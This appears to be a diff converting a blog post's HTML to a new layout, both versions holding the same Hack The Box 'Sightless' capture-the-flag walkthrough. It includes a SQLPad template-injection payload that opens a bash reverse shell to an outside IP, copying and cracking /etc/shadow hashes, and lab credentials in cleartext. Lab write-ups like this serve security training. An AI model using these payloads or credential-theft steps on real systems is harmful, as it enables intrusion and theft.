@@ -1,1 +1,189 @@
-<html><head><meta charset="utf-8"></head><body><figure class="image"><img style="aspect-ratio:1264/169;" src="../img/posts/2024-10-13-Sightless(HTB)/01-eb41925042.png" width="1264" height="169"></figure><p>“easy” machine</p><p>We have port 21,22 and 80 open</p><p>&nbsp;</p><p><code>PORT &nbsp; STATE SERVICE VERSION</code><br><code>21/tcp open &nbsp;ftp</code><br><code>| fingerprint-strings:&nbsp;</code><br><code>| &nbsp; GenericLines:&nbsp;</code><br><code>| &nbsp; &nbsp; 220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]</code><br><code>| &nbsp; &nbsp; Invalid command: try being more creative</code><br><code>|_ &nbsp; &nbsp;Invalid command: try being more creative</code><br><code>22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</code><br><code>| ssh-hostkey:&nbsp;</code><br><code>| &nbsp; 256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)</code><br><code>|_ &nbsp;256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)</code><br><code>80/tcp open &nbsp;http &nbsp; &nbsp;nginx 1.18.0 (Ubuntu)</code><br><code>|_http-title: Did not follow redirect to http://sightless.htb/</code><br><code>| http-methods:&nbsp;</code><br><code>|_ &nbsp;Supported Methods: GET HEAD POST OPTIONS</code><br><code>|_http-server-header: nginx/1.18.0 (Ubuntu)</code><br><code>1 service unrecognized despite returning data. If you know the service/ve</code></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as root(inside of docker)</u></strong></span></p><p>&nbsp;</p><p>FFUF finds no subdomains and we have no interesting directories</p><p>&nbsp;</p><p>This link points us to a subdomain sql pad which we can access after adding it to our /etc/hosts file</p><p>http://sqlpad.sightless.htb/</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1891/568;" src="../img/posts/2024-10-13-Sightless(HTB)/02-84cae0d756.png" width="1891" height="568"></figure><p>&nbsp;</p><p>&nbsp;</p><p>The site seems to allow us to execute sql querries if we connect to a database. But we do not have any creds so we cannot connect to anything.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2550/872;" src="../img/posts/2024-10-13-Sightless(HTB)/03-62f59f3e29.png" width="2550" height="872"></figure><p>&nbsp;</p><p>Using apache pinot we can get a callback to our machine by entering our IP but we cant really exploit this further.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:550/676;" src="../img/posts/2024-10-13-Sightless(HTB)/04-b36538199e.png" width="550" height="676"></figure><figure class="image image-style-block-align-left"><img style="aspect-ratio:595/154;" src="../img/posts/2024-10-13-Sightless(HTB)/05-b6e82490c1.png" width="595" height="154"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>In the about section of sqlpad we can find the version</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:652/362;" src="../img/posts/2024-10-13-Sightless(HTB)/06-b409917261.png" width="652" height="362"></figure><p>&nbsp;</p><p>&nbsp;</p><p>With a lot of googling i found a POC we can use to exploit this.</p><p>https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We select a new connection with the driver MySQL and set the database to the command below which will execute a bash command giving us a reverse shell.</p><p>&nbsp;</p><p><code>{{ process.mainModule.require('child_process').exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.4/443 0&gt;&amp;1"') }}</code></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:561/1285;" src="../img/posts/2024-10-13-Sightless(HTB)/07-1c2d36b217.png" width="561" height="1285"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:625/193;" src="../img/posts/2024-10-13-Sightless(HTB)/08-116586ea25.png" width="625" height="193"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Looks like we are inside of a docker container.</p><p>&nbsp;</p><p>IN the sqlpad directory there is a sql lite file. I was able to mount it to sqlpad and access the user hashes but its just for sqlpad and doesnt look useful.&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:660/1006;" src="../img/posts/2024-10-13-Sightless(HTB)/09-47e329322b.png" width="660" height="1006"></figure><p>$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC</p><p>Admin hash cracks to admin</p><p>&nbsp;</p><p>No obvious ways to breakout of the container so im going to try other things.</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Michael</u></strong></span></p><p>&nbsp;</p><p>&nbsp;</p><p>The /home directory has a user named michael</p><p>&nbsp;</p><p>michael has an entry in /etc/passwd and /etc/shadow so I copy both files to my machine and use unshadow with john.</p><p>&nbsp;</p><p><code>unshadow passwd shadow &gt; passwd-shadow.txt</code></p><p>I dont want to crack every hash in the file so I only grab michaels hash and move it to a michael.txt file</p><p><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/</code><br>&nbsp;</p><p>Cracked the hash</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:799/249;" src="../img/posts/2024-10-13-Sightless(HTB)/10-bd699c1221.png" width="799" height="249"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can now ssh in and get the user flag</p><p>michael:insaneclownposse</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:708/227;" src="../img/posts/2024-10-13-Sightless(HTB)/11-8685c51075.png" width="708" height="227"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Root</u></strong></span></p><p>&nbsp;</p><p>Root took me a very long time and I had to get hints. I was familiar with this exploit but never used it before. During linpeas we can see chrome is open with remote debugging port but the port was set to 0 so I didnt think we could use it. Looks like we were supposed to forward random open ports on the machine and hope one happened to be chrome. I was able to portforward 8080 and get to the login page which has authenticated RCE but I had no creds to login. We also had to add localhost to our /etc/hosts file. 127.0.0.1 admin.sightless.htb</p><figure class="image"><img style="aspect-ratio:1571/924;" src="../img/posts/2024-10-13-Sightless(HTB)/12-fd30d96595.png" width="1571" height="924"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Once we got the right port we can inspect traffic from the session and find the cleartext credentials to login.</p><p>I tried each port open by port forwarding with ssh and 42721 happened to be correct.</p><p><code>ssh -L 42721:localhost:42721 michael@10.10.11.32</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:898/501;" src="../img/posts/2024-10-13-Sightless(HTB)/13-b1b0d0cc1c.png" width="898" height="501"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Wait for michael to login and we get creds</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2554/514;" src="../img/posts/2024-10-13-Sightless(HTB)/14-4ebf6ebd23.png" width="2554" height="514"></figure><p>&nbsp;</p><p>admin:ForlorfroxAdmin</p><p>&nbsp;</p><p>&nbsp;</p><p>We can use php-fpm to copy the id_rsa from root to /tmp. Create a new version as shown below.</p><figure class="image"><img style="aspect-ratio:2519/635;" src="../img/posts/2024-10-13-Sightless(HTB)/15-92af75c11e.png" width="2519" height="635"></figure><p>&nbsp;</p><p>Then start/stop fpm to execute the command</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1723/743;" src="../img/posts/2024-10-13-Sightless(HTB)/16-615b2e1084.png" width="1723" height="743"></figure><p>&nbsp;</p><p>This took about an hour to show up and I had to disable/re-enable php over and over and over</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1249/206;" src="../img/posts/2024-10-13-Sightless(HTB)/17-ab33876b4e.png" width="1249" height="206"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:280/39;" src="../img/posts/2024-10-13-Sightless(HTB)/18-834f4c821c.png" width="280" height="39"></figure><p>And to top things off we cannot read the file as its still owned by root. So did the same steps above with chmod 777 /tmp/id_rsa as the command and waited another hour to be able to read the file.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:463/196;" src="../img/posts/2024-10-13-Sightless(HTB)/19-4d238a1054.png" width="463" height="196"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:430/180;" src="../img/posts/2024-10-13-Sightless(HTB)/20-412db616e7.png" width="430" height="180"></figure><p>&nbsp;</p><p>&nbsp;</p><p>By far one of the worst machines ive done and I have no idea how it has an easy rating.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:687/631;" src="../img/posts/2024-10-13-Sightless(HTB)/21-deb4cff700.png" width="687" height="631"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Sightless | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-10-13-Sightless(HTB)/01-eb41925042.png" alt="HTB: Sightless cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Sightless</h1>
+                <div class="post-meta">October 13, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <img alt="Screenshot 1" height="169" src="../img/posts/2024-10-13-Sightless(HTB)/01-eb41925042.png" style="aspect-ratio:1264/169;" width="1264"/>
+
+        <p>“easy” machine</p>
+
+        <p>We have port 21,22 and 80 open</p>
+
+        <p><code>PORT   STATE SERVICE VERSION</code><br/><code>21/tcp open  ftp</code><br/><code>| fingerprint-strings: </code><br/><code>|   GenericLines: </code><br/><code>|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]</code><br/><code>|     Invalid command: try being more creative</code><br/><code>|_    Invalid command: try being more creative</code><br/><code>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</code><br/><code>| ssh-hostkey: </code><br/><code>|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)</code><br/><code>|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)</code><br/><code>80/tcp open  http    nginx 1.18.0 (Ubuntu)</code><br/><code>|_http-title: Did not follow redirect to http://sightless.htb/</code><br/><code>| http-methods: </code><br/><code>|_  Supported Methods: GET HEAD POST OPTIONS</code><br/><code>|_http-server-header: nginx/1.18.0 (Ubuntu)</code><br/><code>1 service unrecognized despite returning data. If you know the service/ve</code></p>
+
+        <h1 style="color:red;">Shell as root(inside of docker)</h1>
+
+        <p>FFUF finds no subdomains and we have no interesting directories</p>
+
+        <p>This link points us to a subdomain sql pad which we can access after adding it to our /etc/hosts file</p>
+
+        <p>http://sqlpad.sightless.htb/</p>
+
+        <img alt="Screenshot 2" height="568" src="../img/posts/2024-10-13-Sightless(HTB)/02-84cae0d756.png" style="aspect-ratio:1891/568;" width="1891"/>
+
+        <p>The site seems to allow us to execute sql querries if we connect to a database. But we do not have any creds so we cannot connect to anything.</p>
+
+        <img alt="Screenshot 3" height="872" src="../img/posts/2024-10-13-Sightless(HTB)/03-62f59f3e29.png" style="aspect-ratio:2550/872;" width="2550"/>
+
+        <p>Using apache pinot we can get a callback to our machine by entering our IP but we cant really exploit this further.</p>
+
+        <img alt="Screenshot 4" height="676" src="../img/posts/2024-10-13-Sightless(HTB)/04-b36538199e.png" style="aspect-ratio:550/676;" width="550"/>
+
+        <img alt="Screenshot 5" height="154" src="../img/posts/2024-10-13-Sightless(HTB)/05-b6e82490c1.png" style="aspect-ratio:595/154;" width="595"/>
+
+        <p>In the about section of sqlpad we can find the version</p>
+
+        <img alt="Screenshot 6" height="362" src="../img/posts/2024-10-13-Sightless(HTB)/06-b409917261.png" style="aspect-ratio:652/362;" width="652"/>
+
+        <p>With a lot of googling i found a POC we can use to exploit this.</p>
+
+        <p>https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</p>
+
+        <p>We select a new connection with the driver MySQL and set the database to the command below which will execute a bash command giving us a reverse shell.</p>
+
+        <pre class="terminal"><code>{{ process.mainModule.require('child_process').exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.4/443 0&gt;&amp;1"') }}</code></pre>
+
+        <img alt="Screenshot 7" height="1285" src="../img/posts/2024-10-13-Sightless(HTB)/07-1c2d36b217.png" style="aspect-ratio:561/1285;" width="561"/>
+
+        <img alt="Screenshot 8" height="193" src="../img/posts/2024-10-13-Sightless(HTB)/08-116586ea25.png" style="aspect-ratio:625/193;" width="625"/>
+
+        <p>Looks like we are inside of a docker container.</p>
+
+        <p>IN the sqlpad directory there is a sql lite file. I was able to mount it to sqlpad and access the user hashes but its just for sqlpad and doesnt look useful. </p>
+
+        <img alt="Screenshot 9" height="1006" src="../img/posts/2024-10-13-Sightless(HTB)/09-47e329322b.png" style="aspect-ratio:660/1006;" width="660"/>
+
+        <p>$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC</p>
+
+        <p>Admin hash cracks to admin</p>
+
+        <p>No obvious ways to breakout of the container so im going to try other things.</p>
+
+        <h1 style="color:red;">Shell as Michael</h1>
+
+        <p>The /home directory has a user named michael</p>
+
+        <p>michael has an entry in /etc/passwd and /etc/shadow so I copy both files to my machine and use unshadow with john.</p>
+
+        <pre class="terminal"><code>unshadow passwd shadow &gt; passwd-shadow.txt</code></pre>
+
+        <p>I dont want to crack every hash in the file so I only grab michaels hash and move it to a michael.txt file</p>
+
+        <pre class="terminal"><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/</code></pre>
+
+        <p>Cracked the hash</p>
+
+        <img alt="Screenshot 10" height="249" src="../img/posts/2024-10-13-Sightless(HTB)/10-bd699c1221.png" style="aspect-ratio:799/249;" width="799"/>
+
+        <p>We can now ssh in and get the user flag</p>
+
+        <p>michael:insaneclownposse</p>
+
+        <img alt="Screenshot 11" height="227" src="../img/posts/2024-10-13-Sightless(HTB)/11-8685c51075.png" style="aspect-ratio:708/227;" width="708"/>
+
+        <h1 style="color:red;">Shell as Root</h1>
+
+        <p>Root took me a very long time and I had to get hints. I was familiar with this exploit but never used it before. During linpeas we can see chrome is open with remote debugging port but the port was set to 0 so I didnt think we could use it. Looks like we were supposed to forward random open ports on the machine and hope one happened to be chrome. I was able to portforward 8080 and get to the login page which has authenticated RCE but I had no creds to login. We also had to add localhost to our /etc/hosts file. 127.0.0.1 admin.sightless.htb</p>
+
+        <img alt="Screenshot 12" height="924" src="../img/posts/2024-10-13-Sightless(HTB)/12-fd30d96595.png" style="aspect-ratio:1571/924;" width="1571"/>
+
+        <p>Once we got the right port we can inspect traffic from the session and find the cleartext credentials to login.</p>
+
+        <p>I tried each port open by port forwarding with ssh and 42721 happened to be correct.</p>
+
+        <pre class="terminal"><code>ssh -L 42721:localhost:42721 michael@10.10.11.32</code></pre>
+
+        <img alt="Screenshot 13" height="501" src="../img/posts/2024-10-13-Sightless(HTB)/13-b1b0d0cc1c.png" style="aspect-ratio:898/501;" width="898"/>
+
+        <p>Wait for michael to login and we get creds</p>
+
+        <img alt="Screenshot 14" height="514" src="../img/posts/2024-10-13-Sightless(HTB)/14-4ebf6ebd23.png" style="aspect-ratio:2554/514;" width="2554"/>
+
+        <p>admin:ForlorfroxAdmin</p>
+
+        <p>We can use php-fpm to copy the id_rsa from root to /tmp. Create a new version as shown below.</p>
+
+        <img alt="Screenshot 15" height="635" src="../img/posts/2024-10-13-Sightless(HTB)/15-92af75c11e.png" style="aspect-ratio:2519/635;" width="2519"/>
+
+        <p>Then start/stop fpm to execute the command</p>
+
+        <img alt="Screenshot 16" height="743" src="../img/posts/2024-10-13-Sightless(HTB)/16-615b2e1084.png" style="aspect-ratio:1723/743;" width="1723"/>
+
+        <p>This took about an hour to show up and I had to disable/re-enable php over and over and over</p>
+
+        <img alt="Screenshot 17" height="206" src="../img/posts/2024-10-13-Sightless(HTB)/17-ab33876b4e.png" style="aspect-ratio:1249/206;" width="1249"/>
+
+        <img alt="Screenshot 18" height="39" src="../img/posts/2024-10-13-Sightless(HTB)/18-834f4c821c.png" style="aspect-ratio:280/39;" width="280"/>
+
+        <p>And to top things off we cannot read the file as its still owned by root. So did the same steps above with chmod 777 /tmp/id_rsa as the command and waited another hour to be able to read the file.</p>
+
+        <img alt="Screenshot 19" height="196" src="../img/posts/2024-10-13-Sightless(HTB)/19-4d238a1054.png" style="aspect-ratio:463/196;" width="463"/>
+
+        <img alt="Screenshot 20" height="180" src="../img/posts/2024-10-13-Sightless(HTB)/20-412db616e7.png" style="aspect-ratio:430/180;" width="430"/>
+
+        <p>By far one of the worst machines ive done and I have no idea how it has an easy rating.</p>
+
+        <img alt="Screenshot 21" height="631" src="../img/posts/2024-10-13-Sightless(HTB)/21-deb4cff700.png" style="aspect-ratio:687/631;" width="687"/>
+    </article>
+
+</body>
+</html>
